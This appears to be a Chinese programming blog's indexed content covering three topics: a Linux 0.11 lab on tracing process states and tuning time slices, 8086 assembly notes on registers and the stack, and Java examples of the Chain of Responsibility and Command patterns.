Burst：I/O区间\nCPU调度(CPU scheduling)：多个进程同时处于内存，当一个进程必须等待时，OS从该进程拿走CPU使用权交给其他进程。\n进程执行从一个**IO区间(I/O burst)开始，随后进入一个CPU区间(CPU burst)**并反复，进程循环地在CPU执行和I/O等待两个状态间切换，直到通过系统请求终止最后一个CPU burst。\nCPU burst的长度随进程和计算机的不同而变化，通常具有大量短CPU burst和少量长CPU burst。I/O约束程序通常具有很多短CPU burst，CPU约束程序可能有少量长CPU burst。\n每当CPU空闲时，OS就使用短期调度程序(short-term scheduler) （或CPU scheduler）从就绪队列中选择一个能够执行的进程并为它分配CPU。\n就绪队列不一定是FIFO队列。就绪队列中的记录通常为PCB。\n4.8 修改时间片 时间片即CPU分配给各个程序的时间，每个线程被分配一个时间段，称作它的时间片，即该进程允许运行的时间，使各个程序从表面上看是同时进行的。如果在时间片结束时进程还在运行，则CPU将被剥夺并分配给另一个进程。如果进程在时间片结束前阻塞或结束，则CPU当即进行切换。而不会造成CPU资源浪费。在宏观上：我们可以同时打开多个应用程序，每个程序并行不悖，同时运行。但在微观上：由于只有一个CPU，一次只能处理程序要求的一部分，如何处理公平，一种方法就是引入时间片，每个程序轮流执行。\n下面是 0.11 的调度函数 schedule，在文件 kernel/sched.c 中定义为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 while (1) { c = -1; next = 0; i = NR_TASKS; p = \u0026amp;task[NR_TASKS]; // 找到 counter 值最大的就绪态进程 while (--i) { if (!*--p) continue; if ((*p)-\u0026gt;state == TASK_RUNNING \u0026amp;\u0026amp; (*p)-\u0026gt;counter \u0026gt; c) c = (*p)-\u0026gt;counter, next = i; } // 如果有 counter 值大于 0 的就绪态进程，则退出 if (c) break; // 如果没有： // 所有进程的 counter 值除以 2 衰减后再和 priority 值相加， // 产生新的时间片 for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (*p) (*p)-\u0026gt;counter = ((*p)-\u0026gt;counter \u0026gt;\u0026gt; 1) + (*p)-\u0026gt;priority; } // 切换到 next 进程 switch_to(next); 分析代码可知，0.11 的调度算法是选取 counter 值最大的就绪进程进行调度。\n其中运行态进程（即 current）的 counter 数值会随着时钟中断而不断减 1（时钟中断 10ms 一次），所以是一种比较典型的时间片轮转调度算法。\n另外，由上面的程序可以看出，当没有 counter 值大于 0 的就绪进程时，要对所有的进程做 (*p)-\u0026gt;counter = ((*p)-\u0026gt;counter \u0026gt;\u0026gt; 1) + (*p)-\u0026gt;priority。其效果是对所有的进程（包括阻塞态进程）都进行 counter 的衰减，并再累加 priority 值。这样，对正被阻塞的进程来说，一个进程在阻塞队列中停留的时间越长，其优先级越大，被分配的时间片也就会越大。\n所以总的来说，Linux 0.11 的进程调度是一种综合考虑进程优先级并能动态反馈调整时间片的轮转调度算法。\n此处要求实验者对现有的调度算法进行时间片大小的修改，并进行实验验证。\n为完成此工作，我们需要知道两件事情：\n进程 counter 是如何初始化的 当进程的时间片用完时，被重新赋成何值？ 首先回答第一个问题，显然这个值是在 fork() 中设定的。Linux 0.11 的 fork() 会调用 copy_process() 来完成从父进程信息拷贝（所以才称其为 fork），看看 copy_process() 的实现（也在 kernel/fork.c 文件中），会发现其中有下面两条语句：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 用来复制父进程的PCB数据信息，包括 priority 和 counter *p = *current; // 初始化 counter p-\u0026gt;counter = p-\u0026gt;priority; // 因为父进程的counter数值已发生变化，而 priority 不会，所以上面的第二句代码将p-\u0026gt;counter 设置成 p-\u0026gt;priority。 // 每个进程的 priority 都是继承自父亲进程的，除非它自己改变优先级。 // 查找所有的代码，只有一个地方修改过 priority，那就是 nice 系统调用。 int sys_nice(long increment) { if (current-\u0026gt;priority-increment\u0026gt;0) current-\u0026gt;priority -= increment; return 0; } 本实验假定没有人调用过 nice 系统调用，时间片的初值就是进程 0 的 priority，即宏 INIT_TASK 中定义的：\n1 2 3 #define INIT_TASK \\ { 0,15,15, // 上述三个值分别对应 state、counter 和 priority; 接下来回答第二个问题，当就绪进程的 counter 为 0 时，不会被调度（schedule 要选取 counter 最大的，大于 0 的进程），而当所有的就绪态进程的 counter 都变成 0 时，会执行下面的语句：\n1 (*p)-\u0026gt;counter = ((*p)-\u0026gt;counter \u0026gt;\u0026gt; 1) + (*p)-\u0026gt;priority; 显然算出的新的 counter 值也等于 priority，即初始时间片的大小。\n提示就到这里。如何修改时间片，自己思考、尝试吧。\n5.实验步骤 1.修改process.c文件 实验楼在teacher文件夹内提供了process.c文件的模板，另外哈工大git上也有这个文件，在对其进行修改的过程中主要是在main函数内增加一些语句，用 fork() 建立若干个同时运行的子进程，父进程等待所有子进程退出后才退出，每个子进程各自执行 cpuio_bound()，从而实现样本程序。下面贴出process.c更改后的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;sys/times.h\u0026gt; #define HZ\t100 void cpuio_bound(int last, int cpu_time, int io_time); int main(int argc, char * argv[]) { pid_t n_proc[10]; /*10个子进程 PID*/ int i; for(i=0;i\u0026lt;10;i++) { n_proc[i] = fork(); /*子进程*/ if(n_proc[i] == 0) { cpuio_bound(20,2*i,20-2*i); /*每个子进程都占用20s*/ return 0; /*执行完cpuio_bound 以后，结束该子进程*/ } /*fork 失败*/ else if(n_proc[i] \u0026lt; 0 ) { printf(\u0026#34;Failed to fork child process %d!\\n\u0026#34;,i+1); return -1; } /*父进程继续fork*/ } /*打印所有子进程PID*/ for(i=0;i\u0026lt;10;i++) printf(\u0026#34;Child PID: %d\\n\u0026#34;,n_proc[i]); /*等待所有子进程完成*/ wait(\u0026amp;i); /*Linux 0.11 上 gcc要求必须有一个参数, gcc3.4+则不需要*/ return 0; } /* * 此函数按照参数占用CPU和I/O时间 * last: 函数实际占用CPU和I/O的总时间，不含在就绪队列中的时间，\u0026gt;=0是必须的 * cpu_time: 一次连续占用CPU的时间，\u0026gt;=0是必须的 * io_time: 一次I/O消耗的时间，\u0026gt;=0是必须的 * 如果last \u0026gt; cpu_time + io_time，则往复多次占用CPU和I/O * 所有时间的单位为秒 */ void cpuio_bound(int last, int cpu_time, int io_time) { struct tms start_time, current_time; clock_t utime, stime; int sleep_time; while (last \u0026gt; 0) { /* CPU Burst */ times(\u0026amp;start_time); /* 其实只有t.tms_utime才是真正的CPU时间。但我们是在模拟一个 * 只在用户状态运行的CPU大户，就像“for(;;);”。所以把t.tms_stime * 加上很合理。*/ do { times(\u0026amp;current_time); utime = current_time.tms_utime - start_time.tms_utime; stime = current_time.tms_stime - start_time.tms_stime; } while ( ( (utime + stime) / HZ ) \u0026lt; cpu_time ); last -= cpu_time; if (last \u0026lt;= 0 ) break; /* IO Burst */ /* 用sleep(1)模拟1秒钟的I/O操作 */ sleep_time=0; while (sleep_time \u0026lt; io_time) { sleep(1); sleep_time++; } last -= sleep_time; } } 2.修改main.c文件 修改main.c的作用是使得操作系统在启动时就打开log文件，main.c文件在init目录下\n1 2 3 4 5 6 7 8 9 10 11 move_to_user_mode(); /***************自定义代码块--开始***************/ setup((void *) \u0026amp;drive_info); (void) open(\u0026#34;/dev/tty0\u0026#34;,O_RDWR,0); (void) dup(0); (void) dup(0); (void) open(\u0026#34;/var/process.log\u0026#34;,O_CREAT|O_TRUNC|O_WRONLY,0666); /***************自定义代码块--结束***************/ if (!fork()) {\t/* we count on this going ok */ init(); } 3.修改printk.c文件 系统在内核状态下只能使用printk函数，下面对printk增加了fprintk函数：(文件位置kernel/printk.c)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; static char logbuf[1024]; int fprintk(int fd, const char *fmt, ...) { va_list args; int count; struct file * file; struct m_inode * inode; va_start(args, fmt); count=vsprintf(logbuf, fmt, args); va_end(args); /* 如果输出到stdout或stderr，直接调用sys_write即可 */ if (fd \u0026lt; 3) { __asm__(\u0026#34;push %%fs\\n\\t\u0026#34; \u0026#34;push %%ds\\n\\t\u0026#34; \u0026#34;pop %%fs\\n\\t\u0026#34; \u0026#34;pushl %0\\n\\t\u0026#34; /* 注意对于Windows环境来说，是_logbuf,下同 */ \u0026#34;pushl $logbuf\\n\\t\u0026#34; \u0026#34;pushl %1\\n\\t\u0026#34; /* 注意对于Windows环境来说，是_sys_write,下同 */ \u0026#34;call sys_write\\n\\t\u0026#34; \u0026#34;addl $8,%%esp\\n\\t\u0026#34; \u0026#34;popl %0\\n\\t\u0026#34; \u0026#34;pop %%fs\u0026#34; ::\u0026#34;r\u0026#34; (count),\u0026#34;r\u0026#34; (fd):\u0026#34;ax\u0026#34;,\u0026#34;cx\u0026#34;,\u0026#34;dx\u0026#34;); } else /* 假定\u0026gt;=3的描述符都与文件关联。事实上，还存在很多其它情况，这里并没有考虑。*/ { /* 从进程0的文件描述符表中得到文件句柄 */ if (!(file=task[0]-\u0026gt;filp[fd])) return 0; inode=file-\u0026gt;f_inode; __asm__(\u0026#34;push %%fs\\n\\t\u0026#34; \u0026#34;push %%ds\\n\\t\u0026#34; \u0026#34;pop %%fs\\n\\t\u0026#34; \u0026#34;pushl %0\\n\\t\u0026#34; \u0026#34;pushl $logbuf\\n\\t\u0026#34; \u0026#34;pushl %1\\n\\t\u0026#34; \u0026#34;pushl %2\\n\\t\u0026#34; \u0026#34;call file_write\\n\\t\u0026#34; \u0026#34;addl $12,%%esp\\n\\t\u0026#34; \u0026#34;popl %0\\n\\t\u0026#34; \u0026#34;pop %%fs\u0026#34; ::\u0026#34;r\u0026#34; (count),\u0026#34;r\u0026#34; (file),\u0026#34;r\u0026#34; (inode):\u0026#34;ax\u0026#34;,\u0026#34;cx\u0026#34;,\u0026#34;dx\u0026#34;); } return count; } 4.修改fork.c文件 fork.c文件在kernel目录下，下面做出两处修改：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int copy_process(int nr,……) { struct task_struct *p; // …… // 获得一个 task_struct 结构体空间 p = (struct task_struct *) get_free_page(); // …… p-\u0026gt;pid = last_pid; // …… // 设置 start_time 为 jiffies p-\u0026gt;start_time = jiffies; //新增修改 fprintk(3,\u0026#34;%d\\tN\\t%d\\n\u0026#34;,p-\u0026gt;pid,jiffies); // …… /* 设置进程状态为就绪。所有就绪进程的状态都是 TASK_RUNNING(0），被全局变量 current 指向的 是正在运行的进程。*/ p-\u0026gt;state = TASK_RUNNING; //新增修改 fprintk(3,\u0026#34;%d\\tJ\\t%d\\n\u0026#34;,p-\u0026gt;pid,jiffies); return last_pid; } 5.修改sched.c文件 文件位置：kernel/sched.c，下面做出两处修改：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void schedule(void) { int i,next,c; struct task_struct ** p; // …… if (((*p)-\u0026gt;signal \u0026amp; ~(_BLOCKABLE \u0026amp; (*p)-\u0026gt;blocked)) \u0026amp;\u0026amp; (*p)-\u0026gt;state==TASK_INTERRUPTIBLE) { (*p)-\u0026gt;state=TASK_RUNNING; /*新建修改--可中断睡眠 =\u0026gt; 就绪*/ fprintk(3,\u0026#34;%d\\tJ\\t%d\\n\u0026#34;,(*p)-\u0026gt;pid,jiffies); } // ……\t/*编号为next的进程 运行*/\tif(current-\u0026gt;pid != task[next] -\u0026gt;pid) { /*新建修改--时间片到时程序 =\u0026gt; 就绪*/ if(current-\u0026gt;state == TASK_RUNNING) fprintk(3,\u0026#34;%d\\tJ\\t%d\\n\u0026#34;,current-\u0026gt;pid,jiffies); fprintk(3,\u0026#34;%d\\tR\\t%d\\n\u0026#34;,task[next]-\u0026gt;pid,jiffies); } switch_to(next); } 1.修改sys_pause函数 1 2 3 4 5 6 7 8 9 10 11 int sys_pause(void) { current-\u0026gt;state = TASK_INTERRUPTIBLE; /* *修改--当前进程 运行 =\u0026gt; 可中断睡眠 */ if(current-\u0026gt;pid != 0) fprintk(3,\u0026#34;%d\\tW\\t%d\\n\u0026#34;,current-\u0026gt;pid,jiffies); schedule(); return 0; } 2.修改sleep_on函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 void sleep_on(struct task_struct **p) { struct task_struct *tmp; if (!p) return; if (current == \u0026amp;(init_task.task)) panic(\u0026#34;task[0] trying to sleep\u0026#34;); tmp = *p; *p = current; current-\u0026gt;state = TASK_UNINTERRUPTIBLE; /* *修改--当前进程进程 =\u0026gt; 不可中断睡眠 */ fprintk(3,\u0026#34;%d\\tW\\t%d\\n\u0026#34;,current-\u0026gt;pid,jiffies); schedule(); if (tmp) { tmp-\u0026gt;state=0; /* *修改--原等待队列 第一个进程 =\u0026gt; 唤醒（就绪） */ fprintk(3,\u0026#34;%d\\tJ\\t%d\\n\u0026#34;,tmp-\u0026gt;pid,jiffies); } } 3.修改interruptible_sleep_on函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 void interruptible_sleep_on(struct task_struct **p) { struct task_struct *tmp; if (!p) return; if (current == \u0026amp;(init_task.task)) panic(\u0026#34;task[0] trying to sleep\u0026#34;); tmp=*p; *p=current; repeat:\tcurrent-\u0026gt;state = TASK_INTERRUPTIBLE; /* *修改--唤醒队列中间进程，过程中使用Wait */ fprintk(3,\u0026#34;%d\\tW\\t%d\\n\u0026#34;,current-\u0026gt;pid,jiffies); schedule(); if (*p \u0026amp;\u0026amp; *p != current) { (**p).state=0; /* *修改--当前进程进程 =\u0026gt; 可中断睡眠 */ fprintk(3,\u0026#34;%d\\tJ\\t%d\\n\u0026#34;,(*p)-\u0026gt;pid,jiffies); goto repeat; } *p=NULL; if (tmp) { tmp-\u0026gt;state=0; /* *修改--原等待队列 第一个进程 =\u0026gt; 唤醒（就绪） */ fprintk(3,\u0026#34;%d\\tJ\\t%d\\n\u0026#34;,tmp-\u0026gt;pid,jiffies); } } 4.修改wake_up函数 1 2 3 4 5 6 7 8 9 10 11 void wake_up(struct task_struct **p) { if (p \u0026amp;\u0026amp; *p) { (**p).state=0; /* *修改--唤醒 最后进入等待序列的 进程 */ fprintk(3,\u0026#34;%d\\tJ\\t%d\\n\u0026#34;,(*p)-\u0026gt;pid,jiffies); *p=NULL; } } 6.修改exit.c文件 此文件的位置在kernel目录下，修改了两处位置，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 int do_exit(long code) { int i; free_page_tables(get_base(current-\u0026gt;ldt[1]),get_limit(0x0f)); free_page_tables(get_base(current-\u0026gt;ldt[2]),get_limit(0x17)); // …… current-\u0026gt;state = TASK_ZOMBIE; /* *修改--退出一个进程 */ fprintk(3,\u0026#34;%d\\tE\\t%d\\n\u0026#34;,current-\u0026gt;pid,jiffies); current-\u0026gt;exit_code = code; tell_father(current-\u0026gt;father); schedule(); return (-1);\t/* just to suppress warnings */ } // …… int sys_waitpid(pid_t pid,unsigned long * stat_addr, int options) { int flag, code; struct task_struct ** p; // …… // …… if (flag) { if (options \u0026amp; WNOHANG) return 0; current-\u0026gt;state=TASK_INTERRUPTIBLE; /* *修改--当前进程 =\u0026gt; 等待 */ fprintk(3,\u0026#34;%d\\tW\\t%d\\n\u0026#34;,current-\u0026gt;pid,jiffies); schedule(); if (!(current-\u0026gt;signal \u0026amp;= ~(1\u0026lt;\u0026lt;(SIGCHLD-1)))) goto repeat; else return -EINTR; } return -ECHILD; } 7.make 上述步骤中已经修改了所有的必要文件，直接执行make命令编译内核即可\n8.编译运行process.c 将process.c拷贝到linux0.11系统中，这个过程需要挂载一下系统硬盘，挂载拷贝成功之后再卸载硬盘，然后启动模拟器进入系统内编译一下process.c文件，过程命令及截图如下：\n1 2 3 4 5 sudo ./mount-hdc cp ./process.c ./hdc/usr/root/ sudo umonut hdc ./run gcc -o process process.c 编译process.c的过程如下：\n使用./process即可运行目标文件\n关闭 bochs 前都要执行一下 sync 命令，它会刷新 cache，确保文件确实写入了磁盘\n运行后会生成log文件，生成log文件后将其拷贝到oslab根目录，命令如下：\n1 2 3 sudo ./mount-hdc cp ./hdc/var/process.log ./ sudo umonut hdc 9.process.log自动化分析 由于默认的python脚本是使用的python2环境，我在Ubuntu上安装的是python3环境，所以对python脚本大概修改了下，直接把print命令更改下，然后有一处的异常处理将逗号更改为as即可，截图如下：\n由于我的linux使用python的命令是python3，所以python脚本对应的第一行也要更改\nhttps://www.cnblogs.com/fengff/p/11804465.html\n把py脚本传输到linux，给 stat_log.py 加上执行权限（使用的命令为 chmod +x stat_log.py）\n修改了python脚本并确定可以执行之后，使用如下命令执行自动化分析： （需要筛选的进程为执行process显示的Child PID）不输入-g就只会输出开头的表格\n1 ./stat_log.py process.log 0 1 2 3 4 5 -g 遇到的问题 我执行的时候出不来结果\n解决：\n我在main中重复执行了两次，==要把init中的代码移出去==\n但是还是不行，从打印的文件上来看，就绪状态打印了两次，为什么？\n查看之前修改的文件，发现改的代码和示例给的不一样，改的代码忘了用括号把print包起来了 ，这就导致不管状态有没有改变他都会打印，所以上面那个日志就会打印两个一样的，修改之后问题解决\n分析结果如下：\n10.修改时间片 通过分析实验楼给出的schedule调度函数可以知道0.11 的调度算法是选取 counter 值最大的就绪进程进行调度。函数代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 while (1) { c = -1; next = 0; i = NR_TASKS; p = \u0026amp;task[NR_TASKS]; // 找到 counter 值最大的就绪态进程 while (--i) { if (!*--p) continue; if ((*p)-\u0026gt;state == TASK_RUNNING \u0026amp;\u0026amp; (*p)-\u0026gt;counter \u0026gt; c) c = (*p)-\u0026gt;counter, next = i; } // 如果有 counter 值大于 0 的就绪态进程，则退出 if (c) break; // 如果没有： // 所有进程的 counter 值除以 2 衰减后再和 priority 值相加， // 产生新的时间片 for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (*p) (*p)-\u0026gt;counter = ((*p)-\u0026gt;counter \u0026gt;\u0026gt; 1) + (*p)-\u0026gt;priority; } // 切换到 next 进程 switch_to(next); 找到时间片的定义：\n1 2 3 #define INIT_TASK \\ { 0,15,15, // 上述三个值分别对应 state、counter 和 priority; 据此注释可以修改时间片\n在include/linux/sched.h中修改#define INIT_TASK宏定义中counter和priority数值，原始时间片为15，据此可以修改时间片。\n1.时间片为10 重复process.log自动化分析步骤得出如下结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 Process Turnaround Waiting CPU Burst I/O Burst 7 2298 97 0 2200 8 2319 1687 200 432 9 2368 2098 270 0 10 2358 2087 270 0 11 2347 2076 270 0 12 2336 2066 270 0 13 2326 2055 270 0 14 2315 2044 270 0 15 2304 2034 270 0 16 2292 2021 270 0 Average: 2326.30 1826.50 Throughout: 0.41/s 2.时间片为15 重复process.log自动化分析步骤得出如下结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 Process Turnaround Waiting CPU Burst I/O Burst 7 2247 142 0 2105 8 2202 1686 200 315 9 2246 1991 255 0 10 2230 1975 255 0 11 2215 1959 255 0 12 2199 1944 255 0 13 2183 1928 255 0 14 2168 1912 255 0 15 2152 1897 255 0 16 2137 1881 255 0 Average: 2197.90 1731.50 Throughout: 0.44/s 3.时间片为20 重复process.log自动化分析步骤得出如下结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 Process Turnaround Waiting CPU Burst I/O Burst 7 2587 187 0 2400 8 2567 1766 200 600 9 2608 2308 300 0 10 2585 2285 300 0 11 2565 2264 300 0 12 2544 2244 300 0 13 2523 2223 300 0 14 2503 2202 300 0 15 2482 2182 300 0 16 2461 2161 300 0 Average: 2542.50 1982.20 Throughout: 0.38/s 问题回答 问题一 单进程编程较于多进程编程要更简单，利用率低，因为单进程是顺序执行的，而多进程编程是同步执行的，需要复杂且灵活的调度算法，充分利用CPU资源，所以情况要复杂得多。在设计多进程编程时，要考虑资源的分配，时间片的分配等达到系统调度的平衡。要综合考虑所有进程的情况以达到最优的并行执行效果。且多进程编程的功能更为强大，且应用范围较于单进程编程更加广泛。\n问题二 将时间片变小，进程调度次数变多，系统会使得该进程等待时间变长。 将时间片增大，进程因中断/睡眠而产生的调度次数也增多，等待时间也会变长。 总结：时间片要设置合理，不能过大或者过小。 ","permalink":"https://chance7bin.github.io/posts/basic/os-lab/%E5%AE%9E%E9%AA%8C4-%E8%BF%9B%E7%A8%8B%E8%BF%90%E8%A1%8C%E8%BD%A8%E8%BF%B9%E7%9A%84%E8%B7%9F%E8%B8%AA%E4%B8%8E%E7%BB%9F%E8%AE%A1/","summary":"1.实验目的 掌握 Linux 下的多进程编程技术； 通过对进程运行轨迹的跟踪来形象化进程的概念； 在进程运行轨迹跟踪的基础上进行相应的数据统计，从而能对进程","title":"实验4 进程运行轨迹的跟踪与统计"},{"content":"3.1 内存中的字存储 字单元，即存放一个字型数据(16位)的内存单元，由两个地址连续的内存单元组成。高地址内存单元中存放字型数据的高位字节，低地址内存单元中存放字型数据的低位字节。\n将起始地址为N的字单元简称为N地址字单元。比如一个字单元由2、3两个内存单元组成，则这个字单元的起始地址为2，可以说这是2地址字单元。\n20000（4E20H）、18（0012H）\n3.2 DS和[address] CPU 要读写一个内存单元的时候，必须先给出这个内存单元的地址，在8086PC 中，内存地址由段地址和偏移地址组成。8086CPU中有一个DS寄存器，通常用来存放要访问数据的段地址。比如我们要读取10000H单元的内容，可以用如下的程序段进行。（从内存单元送到寄存器中）\n1 2 3 mov bx,1000H mov ds,bx mov al,[0] “[···]”表示一个内存单元，“[···]”中的0表示内存单元的偏移地址。只有偏移地址是不能定位一个内存单元的，指令执行时，==8086CPU自动取ds中的数据为内存单元的段地址==。\n如何把一个数据送入寄存器呢？\n==8086CPU 不支持将数据直接送入段寄存器的操作==，ds是一个段寄存器，所以mov ds,1000H这条指令是非法的。那么如何将1000H送入ds呢?只好用一个寄存器来进行中转，即先将1000H送入一个一般的寄存器，如 bx，再将bx中的内容送入ds。\n1 2 3 mov bx,1000H mov ds,bx mov [0],al 3.3 字的传送 只要在 mov指令中给出16 位的寄存器就可以进行16位数据的传送了。\n1 2 3 4 mov bx,1000H mov ds,bx mov ax,[0] ; 1000:0处的字型数据送入ax mov [0],cx ; cx中的16位数据送到1000:0处 3.7 CPU提供的栈机制 8086CPU 提供入栈和出栈指令，最基本的两个是PUSH(入栈)和POP(出栈)。比如，push ax表示将寄存器ax中的数据送入栈中，pop ax表示从栈顶取出数据送入ax。==8086CPU的入栈和出栈操作都是以字为单位进行的==。\nCPU 如何知道当前要执行的指令所在的位置？我们现在知道答案，那就是CS、IP中存放着当前指令的段地址和偏移地址。\n现在的问题是：CPU如何知道栈顶的位置？显然，也应该有相应的寄存器来存放栈顶的地址，8086CPU 中，有两个寄存器，==段寄存器SS和寄存器SP，栈顶的段地址存放在SS 中，偏移地址存放在SP中==。任意时刻，==SS:SP指向栈顶元素==。push指令和pop指令执行时，CPU从SS和SP中得到栈顶的地址。\npush ax的执行，由以下两步完成。\n(1) SP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶;\n(2)将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶。\n图3.10描述了8086CPU对push指令的执行过程。\n从图中我们可以看出，8086CPU中，==入栈时，栈顶从高地址向低地址方向增长==。\n思考：如果将10000H~1000FH这段空间当作栈，初始状态栈是空的，此时，SS=1000H,SP=？\nSP=0010H，如图3.11所示。\npop ax的执行过程和push ax刚好相反，由以下两步完成。\n(1) 将SS:SP指向的内存单元处的数据送入ax中;\n(2) SP=SP+2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。\n图3.12描述了8086CPU对pop指令的执行过程。\n注意，图 3.12中，出栈后，SS:SP指向新的栈顶1000EH，pop操作前的栈顶元素，1000CH 处的2266H依然存在，但是，它已不在栈中。当再次执行 push等入栈指令后，SS:SP移至1000CH，并在里面写入新的数据，它将被覆盖。\n段的综述 我们可以用一个段存放数据，将它定义为“数据段”；\n我们可以用一个段存放代码，将它定义为“代码段”；\n我们可以用一个段当作栈，将它定义为“栈段”。\n我们可以这样安排，但若要让CPU按照我们的安排来访问这些段，就要：\n对于数据段，将它的段地址放在 DS 中，用mov、add、sub等访问内存单元的指令时，CPU就将我们定义的数据段中的内容当作数据来访问；\n对于代码段，将它的段地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码段中的指令；\n对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在需要进行栈操作的时候，比如执行push、pop指令等，就将我们定义的栈段当作栈空间来用。\nDebug （1）关于D命令\nDebug 在执行如d 段地址:偏移地址这种D命令时，将段地址送入ds 中比较方便。\nD命令也提供了一种符合CPU机理的格式：d 段寄存器:偏移地址，以段寄存器中的数据为段地址SA，列出从SA:偏移地址开始的内存区间中的数据。以下是几个例子。\n（2）在E、A、U命令中使用段寄存器。\n在E、A、U这些可以带有内存单元地址的命令中，也可以同D命令一样，用段寄存器表示内存单元的段地址，以下是几个例子。\n（3）下一条指令执行了吗？\n==Debug 的T命令在执行修改寄存器SS 的指令时，下一条指令也紧接着被执行==（不单是 mov ss,ax，对于如mov ss,bx，mov ss,[0]，pop ss 等指令都会发生上面的情况，这些指令都是修改栈段寄存器SS的指令）。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC3%E7%AB%A0-%E5%AF%84%E5%AD%98%E5%99%A8%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE/","summary":"3.1 内存中的字存储 字单元，即存放一个字型数据(16位)的内存单元，由两个地址连续的内存单元组成。高地址内存单元中存放字型数据的高位字节，低地址","title":"第3章 寄存器（内存访问）"},{"content":"职责链模式——加薪 职责链模式（Chain of Responsibility）：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这个对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。\n结构图 代码实现 Handler\n1 2 3 4 5 6 7 8 9 public abstract class Handler { Handler successor; public void setSuccessor(Handler successor) { this.successor = successor; } abstract void request(int type); } ConcreteHandler\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Handler1 extends Handler{ @Override void request(int type) { if (type \u0026lt; 10){ System.out.println(\u0026#34;handler 1 print\u0026#34;); } else if (super.successor != null) { super.successor.request(type); } else { System.out.println(\u0026#34;can\u0026#39;t solve\u0026#34;); } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Handler2 extends Handler{ @Override void request(int type) { if (type \u0026lt; 20){ System.out.println(\u0026#34;handler 2 print\u0026#34;); } else if (super.successor != null) { super.successor.request(type); } else { System.out.println(\u0026#34;can\u0026#39;t solve\u0026#34;); } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Handler3 extends Handler{ @Override void request(int type) { if (type \u0026lt; 30){ System.out.println(\u0026#34;handler 2 print\u0026#34;); } else if (super.successor != null) { super.successor.request(type); } else { System.out.println(\u0026#34;can\u0026#39;t solve\u0026#34;); } } } Client\n1 2 3 4 5 6 7 8 9 10 11 public static void main(String[] args) { Handler1 handler1 = new Handler1(); Handler2 handler2 = new Handler2(); Handler3 handler3 = new Handler3(); handler1.setSuccessor(handler2); handler2.setSuccessor(handler3); int[] test = {5,15,25,35}; for (int i : test) { handler1.request(i); } } 1 2 3 4 handler 1 print handler 2 print handler 2 print can\u0026#39;t solve 职责链的好处 当客户提交一个请求时，请求是沿链传递直至有一个ConcreteHandler对象负责处理它。\n这就使得接收者和发送者都没有对方的明确信息，且链中的对象自己也并不知道链的结构。结果是职责链可简化对象的相互连接，它们仅需保持一个指向其后继者的引用，而不需保持它所有的候选接受者的引用。这大大降低了耦合度。\n由于是在客户端来定义链的结构，可以随时地增加或修改处理一个请求的结构。增强了给对象指派职责的灵活性。\n命令模式——点菜 命令模式（Command)，将一个请求封装为一个对象，从而使你可用不同的请求对客户进行参数化;对请求排队或记录请求日志，以及支持可撤销的操作。\n结构图 代码实现 Receiver\n1 2 3 4 5 6 7 8 9 public class Receiver { void action1(){ System.out.println(\u0026#34;action1\u0026#34;); } void action2(){ System.out.println(\u0026#34;action2\u0026#34;); } } Command\n1 2 3 4 5 6 7 8 9 public abstract class Commend { Receiver receiver; public Commend(Receiver receiver) { this.receiver = receiver; } abstract void execute(); } ConcreteCommand\n1 2 3 4 5 6 7 8 9 10 public class ConcreteCommend1 extends Commend{ public ConcreteCommend1(Receiver receiver) { super(receiver); } @Override void execute() { receiver.action1(); } } Invoker\n1 2 3 4 5 6 7 8 9 10 11 12 public class Invoker { Commend commend; public Invoker(Commend commend) { this.commend = commend; } void execute(){ commend.execute(); } } Client\n1 2 3 4 5 6 public static void main(String[] args) { Receiver receiver = new Receiver(); ConcreteCommend1 concreteCommend1 = new ConcreteCommend1(receiver); Invoker invoker = new Invoker(concreteCommend1); invoker.execute(); } 命令模式作用 